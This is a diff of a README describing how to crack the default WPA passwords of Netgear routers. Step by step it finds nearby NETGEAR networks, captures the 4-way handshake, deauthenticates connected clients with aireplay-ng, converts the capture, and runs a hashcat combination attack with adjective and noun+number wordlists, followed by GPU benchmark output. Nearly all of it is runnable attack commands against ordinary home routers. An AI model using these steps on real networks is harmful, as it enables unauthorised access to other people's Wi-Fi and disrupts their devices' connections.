@@ -25,9 +25,14 @@ generate-nouns-numbers.py
 
 ## Capturing WPA 4-way Handshake
 
+discover netgear routers:
+```
+sudo airodump-ng --essid-regex NETGEAR[1-9]{2} wlan0
+```
+
 save 4-way handshake to pcap:
 ```
-sudo airodump-ng wlan0 --essid-regex NETGEAR[1-9]{2} -w psk
+sudo airodump-ng --essid NETGEARXX -w netgearXX --output-format cap -c <CHANNEL> wlan0
 ```
 
 deauth client connected to targeted access point to get a handshake
@@ -37,14 +42,14 @@ sudo aireplay-ng -0 1 -a <AP MAC> -c <CLIENT MAC> wlan0
 
 convert pcap to hashcat format
 ```
-hcxpcapngtool -o hash.hc22000 -E wordlist psk-01.cap
+hcxpcapngtool -o netgearXX.hc22000 -E wordlist netgearXX-01.cap
 ```
 
 ## Cracking WPA Password Hash
 
 hashcat Combination attack mode
 ```
-hashcat -m 22000 -a 1 hash.hc22000 top_english_adjs_lower_5000.txt nouns-n-numbers.txt
+hashcat -m 22000 -a 1 netgearXX.hc22000 top_english_adjs_lower_5000.txt nouns-numbers.txt
 ```
 
 ## Math & Benchmarking
@@ -56,7 +61,7 @@ testing was performed with 1 Nvidia 2080TI GPU
 - adjective wordlist size
     - top\_english\_adjs\_lower\_5000.txt: 5000
 - noun + 3 digit number wordlist size
-    - nouns-n-numbers.txt: 10000000
+    - nouns-numbers.txt: 10000000
 - total number of password guesses
     - 50000000000 = 5000 * 10000000
 - time to crack all possible passwords
@@ -73,7 +78,7 @@ Time.Started.....: Wed Sep 13 18:52:20 2023 (2 secs)
 Time.Estimated...: Sun Sep 17 21:52:17 2023 (4 days, 2 hours)
 Kernel.Feature...: Pure Kernel
 Guess.Base.......: File (top-english-wordlists/top_english_adjs_lower_5000.txt), Left Side
-Guess.Mod........: File (nouns-n-numbers.txt), Right Side
+Guess.Mod........: File (nouns-numbers.txt), Right Side
 Speed.#1.........:   140.3 kH/s (0.32ms) @ Accel:64 Loops:128 Thr:32 Vec:1
 Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
 Progress.........: 158848/50000000000 (0.00%)
